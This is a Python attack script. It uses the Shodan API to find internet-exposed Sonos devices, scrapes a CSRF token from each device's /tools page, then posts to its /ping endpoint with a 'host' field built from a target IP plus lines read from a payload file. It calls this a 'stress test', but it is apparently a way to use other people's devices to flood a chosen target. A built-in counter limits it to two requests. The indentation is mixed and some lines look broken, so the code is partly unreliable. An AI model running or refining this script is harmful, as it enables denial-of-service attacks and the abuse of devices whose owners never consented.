from bs4 import BeautifulSoup
import requests
import os.path
import shodan
import sys

try: input = raw_input
except NameError: pass

if os.path.isfile("apiKey.txt"):
    with open('apiKey.txt', 'r') as myfile:
        apiKey=myfile.read().replace('\n', '')
else:
    apiKey = input("Please input your shodan API Key\n>")
    apiKey.strip()
    if len(apiKey) != 32:
        while len(apiKey) != 32:
            apiKey = input("You seem to have input an invalid key,\nplease try again\n>")
    with open("apiKey.txt", "w") as apiFile:
        apiFile.write(apiKey)
    
host = input("Input the IP you wish to stress test.\n>")

with open("listThing.txt") as f:
    inject = f.readlines()

count = 0

api = shodan.Shodan(apiKey)
##Checks for sonos devices throwing 403 Errors##
query = "Linux UPnP/1.0 Sonos/ 403"
result = api.search(query)
##Count feature so a user who has money can iterate through the pages of data and get all usable IPs##
countres = api.count(query)
total = int(countres['total'])
for service in result['matches']:
    ip = service['ip_str']
    ip.strip()
    usableIPs = []
    if "403 Forbidden" in service['data']:
        usableIPs.append(ip)
        headersping = {
        'Proxy-Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Origin': 'http://'+ip+':1400',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Referer': 'http://'+ip+':1400/tools',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        }
        r = requests.get("http://"+ip+":1400/tools")
        c = r.content

        soup = BeautifulSoup(c, 'lxml')

        try:
            csrf = soup.find('input').get('value')
            csrf.strip()
        except:
            pass
	for line in inject:
	    host = host + line
            dataping = {
              'csrfToken': csrf,
              'host': host
            }
            ##This is put here so I don't actually flood any networks.##
            if count < 2:
                count += 1
                response = requests.post('http://'+ip+':1400/ping', headers=headersping, data=dataping)
                print(line + " - " + response)
